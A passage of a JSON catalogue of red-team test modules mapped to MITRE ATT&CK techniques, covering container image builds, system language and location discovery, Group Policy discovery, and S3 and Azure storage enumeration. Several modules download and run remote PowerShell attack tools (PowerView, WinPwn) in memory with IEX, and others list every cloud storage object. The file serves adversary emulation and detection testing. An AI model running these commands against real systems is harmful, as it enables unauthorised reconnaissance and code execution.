      "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "docker build -t t1612  $PathtoRAGLOX ModulesFolder/T1612/src/\ndocker run --name t1612_container --rm -d -t t1612\ndocker exec t1612_container ./test.sh",
        "elevation_required": false,
        "cleanup_command": "docker stop t1612_container\ndocker rmi -f t1612"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify docker service is running.",
          "check_command": "sudo systemctl status docker  --no-pager\n",
          "install_command": "sudo systemctl start docker\n"
        }
      ],
      "rx_module_id": "2db30061-589d-409b-b125-7b473944f9b3",
      "module_name": "Build Image On Host"
    },
    {
      "index": 1725,
      "technique_id": "T1613",
      "technique_name": "Container and Resource Discovery",
      "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "docker build -t t1613 $PathtoRAGLOX ModulesFolder/T1613/src/\ndocker run --name t1613_container --rm -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)",
        "elevation_required": false,
        "cleanup_command": "docker stop t1613_container\ndocker rmi -f t1613"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify Docker is installed.",
          "check_command": "which docker\n",
          "install_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
        },
        {
          "description": "Verify Docker service is running.",
          "check_command": "sudo systemctl status docker --no-pager\n",
          "install_command": "sudo systemctl start docker \n"
        }
      ],
      "rx_module_id": "ea2255df-d781-493b-9693-ac328f9afc3f",
      "module_name": "Docker Container and Resource Discovery"
    },
    {
      "index": 1726,
      "technique_id": "T1613",
      "technique_name": "Container and Resource Discovery",
      "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "sh",
        "command": "podman build -t t1613 $PathtoRAGLOX ModulesFolder/T1613/src/\npodman run --name t1613_container --rm -d -t t1613\npodman ps\npodman stats --no-stream\npodman inspect $(podman ps -l -q --filter ancestor=t1613)",
        "elevation_required": false,
        "cleanup_command": "podman stop t1613_container\npodman rmi -f t1613"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Verify Podman is installed.",
          "check_command": "which podman\n",
          "install_command": "if [ \"\" == \"`which podman`\" ]; then echo \"Podman Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install podman ; elif [ -n \"`which yum`\" ]; then sudo yum -y install podman ; elif [ -n \"`which pacman`\" ]; then sudo pacman -Sy podman --noconfirm ; elif [ -n \"`which brew`\" ]; then brew install podman ; else echo \"Unsupported package manager\"; fi ; else echo \"Podman installed\"; fi        \n"
        },
        {
          "description": "Verify Podman service is running.",
          "check_command": "sudo systemctl status podman --no-pager\n",
          "install_command": "sudo systemctl start podman \n"
        }
      ],
      "rx_module_id": "fc631702-3f03-4f2b-8d8a-6b3d055580a1",
      "module_name": "Podman Container and Resource Discovery"
    },
    {
      "index": 1727,
      "technique_id": "T1614",
      "technique_name": "System Location Discovery",
      "description": "Get geolocation info through IP-Lookup services using curl Windows. The default URL of the IP-Lookup service is https://ipinfo.io/. References: https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{curl_path} -k #{ip_lookup_url}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ip_lookup_url",
          "description": "URL of the IP-Lookup service",
          "type": "url",
          "default_value": "https://ipinfo.io/"
        },
        {
          "name": "curl_path",
          "description": "path to curl.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\Curl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Curl must be installed on system.\n",
          "check_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"
        }
      ],
      "rx_module_id": "fe53e878-10a3-477b-963e-4367348f5af5",
      "module_name": "Get geolocation info through IP-Lookup services using curl Windows"
    },
    {
      "index": 1728,
      "technique_id": "T1614",
      "technique_name": "System Location Discovery",
      "description": "Get geolocation info through IP-Lookup services using curl Windows. The default URL of the IP-Lookup service is https://ipinfo.io/. References: https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "curl -k #{ip_lookup_url}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ip_lookup_url",
          "description": "URL of the IP-Lookup service",
          "type": "url",
          "default_value": "https://ipinfo.io/"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "552b4db3-8850-412c-abce-ab5cc8a86604",
      "module_name": "Get geolocation info through IP-Lookup services using curl freebsd, linux or macos"
    },
    {
      "index": 1729,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "631d4cf1-42c9-4209-8fe9-6bd4de9421be",
      "module_name": "Discover System Language by Registry Query"
    },
    {
      "index": 1730,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "chcp\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d91473ca-944e-477a-b484-0e80217cd789",
      "module_name": "Discover System Language with chcp"
    },
    {
      "index": 1731,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "locale\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "837d609b-845e-4519-90ce-edc3b4b0e138",
      "module_name": "Discover System Language with locale"
    },
    {
      "index": 1732,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "localectl status\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "07ce871a-b3c3-44a3-97fa-a20118fdc7c9",
      "module_name": "Discover System Language with localectl"
    },
    {
      "index": 1733,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check the location of the locale configuration file.\n",
          "check_command": "[ -f /etc/locale.conf ] || [ -f /etc/default/locale ] && exit 0 || exit 1\n",
          "install_command": "echo \"Test only valid for systems that have locale file\"\n"
        }
      ],
      "rx_module_id": "5d7057c9-2c8a-4026-91dd-13b5584daa69",
      "module_name": "Discover System Language by locale file"
    },
    {
      "index": 1734,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "env | grep LANG\nprintenv LANG\nset | grep LANG\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if printenv command exists on the machine\n",
          "check_command": "[ -x \"$(command -v printenv)\" ] && exit 0 || exit 1\n",
          "install_command": "echo \"printenv command does not exist\"\nexit 1\n"
        }
      ],
      "rx_module_id": "cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a",
      "module_name": "Discover System Language by Environment Variable Query"
    },
    {
      "index": 1735,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "The Windows utility DISM (Deployment Image Servicing and Management) can be used to display information about international settings and languages on the currently installed Windows image using an elevated terminal.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dism.exe /online /Get-Intl\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "69f625ba-938f-4900-bdff-82ada3df5d9c",
      "module_name": "Discover System Language with dism.exe"
    },
    {
      "index": 1736,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "This test executes a custom script called LanguageKeyboardLayout.exe which outputs the values of the following Windows API functions to the user terminal: \n\n`GetKeyboardLayout`, `GetKeyboardLayoutList`, `GetUserDefaultUILanguage`, `GetSystemDefaultUILanguage`, `GetUserDefaultLangID`.\n\nDocumentation for these functions is located [here](https://learn.microsoft.com/en-us/windows/win32/api/winuser/).    \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "LanguageKeyboardLayout.exe must exist on disk (default location: PathToRagloxModulesFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1614.001/bin/LanguageKeyboardLayout.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\"\n"
        }
      ],
      "rx_module_id": "e39b99e9-ce7f-4b24-9c88-0fbad069e6c6",
      "module_name": "Discover System Language by Windows API Query"
    },
    {
      "index": 1737,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "WMIC (Windows Management Instrumentation Command-line) is a command-line tool that provides a simplified interface to query and manage Windows system configurations, processes, and hardware information using WMI. \n\nThe command in this test retrieves information about the system's locale, operating system language, and multilingual user interface (MUI) languages.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_host",
          "description": "The host that will be queried.\n\nIf the host contains special characters, it may need to be wrapped in double quotes or double + single quotes. \n\nFor example: \"DESKTOP-123\" or \"'DESKTOP-123'\".\n",
          "type": "string",
          "default_value": "localhost"
        },
        {
          "name": "format_style",
          "description": "You can specify multipe output formats for wmic such as table, list and csv.",
          "type": "string",
          "default_value": "table"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4758003d-db14-4959-9c0f-9e87558ac69e",
      "module_name": "Discover System Language with WMIC"
    },
    {
      "index": 1738,
      "technique_id": "T1614.001",
      "technique_name": "System Location Discovery: System Language Discovery",
      "description": "This PowerShell script collects key system settings, such as the UI language, user language preferences, system locale, current culture, UI culture, and time zone, into a hash table. \n\nIt then outputs these settings in a readable key-value format directly to the terminal. The script is simple and efficient for quickly displaying system configuration details.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$info = @{\n  UILanguage     = Get-WinUILanguageOverride\n  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '\n  SystemLocale   = Get-WinSystemLocale\n  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\n  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\n  TimeZone       = (Get-TimeZone).Id\n}\n$info.GetEnumerator() | ForEach-Object { \"$($_.Name): $($_.Value)\" }",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1f23bfe8-36d4-49ce-903a-19a1e8c6631b",
      "module_name": "Discover System Language with Powershell"
    },
    {
      "index": 1739,
      "technique_id": "T1615",
      "technique_name": "Group Policy Discovery",
      "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "gpresult /z\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0976990f-53b1-4d3f-a185-6df5be429d3b",
      "module_name": "Display group policy information via gpresult"
    },
    {
      "index": 1740,
      "technique_id": "T1615",
      "technique_name": "Group Policy Discovery",
      "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4e524c4e-0e02-49aa-8df5-93f3f7959b9f",
      "module_name": "Get-DomainGPO to display group policy information via PowerView"
    },
    {
      "index": 1741,
      "technique_id": "T1615",
      "technique_name": "Group Policy Discovery",
      "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPOAudit -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bc25c04b-841e-4965-855f-d1f645d7ab73",
      "module_name": "WinPwn - GPOAudit"
    },
    {
      "index": 1742,
      "technique_id": "T1615",
      "technique_name": "Group Policy Discovery",
      "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59",
      "module_name": "WinPwn - GPORemoteAccessPolicy"
    },
    {
      "index": 1743,
      "technique_id": "T1615",
      "technique_name": "Group Policy Discovery",
      "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}",
        "elevation_required": true,
        "cleanup_command": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue"
      },
      "variables": [
        {
          "name": "gpo_output",
          "description": "The output of the Get-GPO cmdlet",
          "type": "string",
          "default_value": "$env:temp\\GPO_Output.txt"
        },
        {
          "name": "gpo_param",
          "description": "You can specify a GPO by its display name or by its globally unique identifier (GUID) to get a single GPO, or you can get all the GPOs in the domain through the All parameter",
          "type": "string",
          "default_value": "-All"
        }
      ],
      "prerequisites": [
        {
          "description": "Add Rsat.ActiveDirectory.DS",
          "check_command": "if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
          "install_command": "Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
        },
        {
          "description": "Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.",
          "check_command": "if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }",
          "install_command": "Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0"
        }
      ],
      "rx_module_id": "52778a8f-a10b-41a4-9eae-52ddb74072bf",
      "module_name": "MSFT Get-GPO Cmdlet"
    },
    {
      "index": 1744,
      "technique_id": "T1619",
      "technique_name": "Cloud Storage Object Discovery",
      "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
        }
      ],
      "rx_module_id": "3c7094f8-71ec-4917-aeb8-a633d7ec4ef5",
      "module_name": "AWS S3 Enumeration"
    },
    {
      "index": 1745,
      "technique_id": "T1619",
      "technique_name": "Cloud Storage Object Discovery",
      "description": "This test enumerates all existing storage accounts and tries to fetch for each account the contained storage account objects. The access to storage objects is only possible if Shared Key authorization is enabled (e.g this is the case per default for storage objects creaded by Azure Function Apps).\n\nRequirements:\n- The test is intended to be executed in interactive mode (with -Interactive parameter) in order to complete the az login command when MFA is required.\n- The EntraID user must have the role \"Storage Account Contributor\", or a role with similar permissions.\n\nOutput format: Csv file that contains the found storage account objects\n- Columns: ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName\n- The content of these columns is filled out depending on the object. Not-required columns are left empt. Example: For a blob object the ResourceGroup, StorageAccountName, ContainerName, BlobName are filled out, the other fields are left empty.",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "az login    # Login to Azure\n\n# Get all storage accounts in the subscription\n$storageAccounts = az storage account list --query \"[].{name:name, resourceGroup:resourceGroup}\" --output json | ConvertFrom-Json\n\n$storageAccountObjects = @()\n$downloadedFunctionFiles = @()\n\nforeach ($account in $storageAccounts) {\n    Write-Output \"`nFound storage account $($account.name)\"\n\n    $storageAccountObjects += [PSCustomObject]@{\n        ResourceGroup      = $account.resourceGroup\n        StorageAccountName = $account.name\n        FileShareName      = \"\"\n        ContainerName      = \"\"\n        BlobName           = \"\"\n        TableName          = \"\"\n        QueueName          = \"\"\n    }\n\n    $allowSharedKeyAccess = az storage account show --name $account.name --resource-group $account.resourceGroup --query \"allowSharedKeyAccess\"\n    \n    if ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n        Write-Output \"Shared key access is disabled for this storage account.\"\n    } else {\n        $connectionString = az storage account show-connection-string --name $account.name --resource-group $account.resourceGroup --query connectionString --output tsv\n        \n        $fileShares = az storage share list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n        foreach($fileShare in $fileShares) {\n            Write-Output \"Found file share: $($fileShare)\"\n            $storageAccountObjects += [PSCustomObject]@{\n                ResourceGroup      = $account.resourceGroup\n                StorageAccountName = $account.name\n                FileShareName      = $fileShare\n                ContainerName      = \"\"\n                BlobName           = \"\"\n                TableName          = \"\"\n                QueueName          = \"\"\n            }\n        }\n\n        $containers = az storage container list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n        foreach($container in $containers) {\n            Write-Output \"Found container: $($container)\"\n            $storageAccountObjects += [PSCustomObject]@{\n                ResourceGroup      = $account.resourceGroup\n                StorageAccountName = $account.name\n                FileShareName      = \"\"\n                ContainerName      = $container\n                BlobName           = \"\"\n                TableName          = \"\"\n                QueueName          = \"\"\n            }\n\n            $blobs = az storage blob list --connection-string $connectionString --container-name $container --query \"[].name\" --output json | ConvertFrom-Json\n\n            foreach($blob in $blobs) {\n                Write-Output \"Found blob: $($blob)\"\n                $storageAccountObjects += [PSCustomObject]@{\n                    ResourceGroup      = $account.resourceGroup\n                    StorageAccountName = $account.name\n                    FileShareName      = \"\"\n                    ContainerName      = $container\n                    BlobName           = $blob\n                    TableName          = \"\"\n                    QueueName          = \"\"\n                }\n            }\n        }\n        \n        $tables = az storage table list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n        foreach($table in $tables) {\n            Write-Output \"Found table: $($table)\"\n            $storageAccountObjects += [PSCustomObject]@{\n                ResourceGroup      = $account.resourceGroup\n                StorageAccountName = $account.name\n                FileShareName      = \"\"\n                ContainerName      = \"\"\n                BlobName           = \"\"\n                TableName          = $table\n                QueueName          = \"\"\n            }\n        }\n        \n        $queues = az storage queue list --connection-string $connectionString --query \"[].name\" --output json | ConvertFrom-Json\n        foreach($queue in $queues) {\n            Write-Output \"Found table: $($table)\"\n            $storageAccountObjects += [PSCustomObject]@{\n                ResourceGroup      = $account.resourceGroup\n                StorageAccountName = $account.name\n                FileShareName      = \"\"\n                ContainerName      = \"\"\n                BlobName           = \"\"\n                TableName          = \"\"\n                QueueName          = $queue\n            }\n        }\n    }\n}\n\n# Store file lists to csv file\n$storageAccountObjects | Export-Csv -Path \"#{output_file}\" -NoTypeInformation\nWrite-Output \"`nDownloaded storage account objects to #{output_file}\"\n\n# Print lists that have been stored as csv file\n$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{output_file}\" -Force -erroraction silentlycontinue\nWrite-Output \"Removed #{output_file}\""
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Csv file path for results",
          "type": "path",
          "default_value": "$env:temp\\T1619_storage_account_objects.csv"
        }
      ],
      "prerequisites": [
        {
          "description": "Azure CLI must be installed",
          "check_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": " Install-Module -Name Az -Force"
        }
      ],
      "rx_module_id": "070322a4-2c60-4c50-8ffb-c450a34fe7bf",
      "module_name": "Azure - Enumerate Storage Account Objects via Shared Key authorization using Azure CLI"
    },
    {
      "index": 1746,
      "technique_id": "T1619",
      "technique_name": "Cloud Storage Object Discovery",
      "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "try{$response = invoke-webrequest \"https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}\" -method \"GET\"}\ncatch [system.net.webexception]\n{if($_.Exception.Response -ne $null)\n{$Response = $_.Exception.Response.GetResponseStream()\n$ReadResponse = New-Object System.IO.StreamReader($Response)\n$ReadResponse.BaseStream.Position = 0\n$responseBody = $ReadResponse.ReadToEnd()}\nelse {$responseBody = \"The storage account could not be anonymously accessed.\"}}\n\"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody\" | out-file -filepath #{output_file} -append\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "base_name",
          "description": "Azure storage account name to test",
          "type": "string",
          "default_value": "T1619Test2"
        },
        {
          "name": "output_file",
          "description": "File to output results to",
          "type": "string",
          "default_value": "$env:temp\\T1619Test2.txt"
        },
        {
          "name": "container_name",
          "description": "Container name to search for (optional)",
          "type": "string",
          "default_value": null
        },
        {
          "name": "blob_name",
          "description": "Blob name to search for (optional)",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [],
      "rx_module_id": "146af1f1-b74e-4aa7-9895-505eb559b4b0",
      "module_name": "Azure - Scan for Anonymous Access to Azure Storage (Powershell)"
    },
    {
      "index": 1747,
      "technique_id": "T1619",
      "technique_name": "Cloud Storage Object Discovery",
      "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "import-module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\nInvoke-EnumerateAzureBlobs -base #{base} -permutations \"#{wordlist}\" -outputfile \"#{output_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "base",
          "description": "Azure blob keyword to enumerate (Example, storage account name)",
          "type": "string",
          "default_value": "secure"
        },
        {
          "name": "output_file",
          "description": "File to output results to",
          "type": "string",
          "default_value": "$env:temp\\T1619Test1.txt"
        },
        {
          "name": "wordlist",
          "description": "File path to keywords for search permutations",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\permutations.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "The Invoke-EnumerateAzureBlobs module must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"\n"
        },
        {
          "description": "The wordlist file for search permutations must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"#{wordlist}\"){exit 0} else {exit 1}\n",
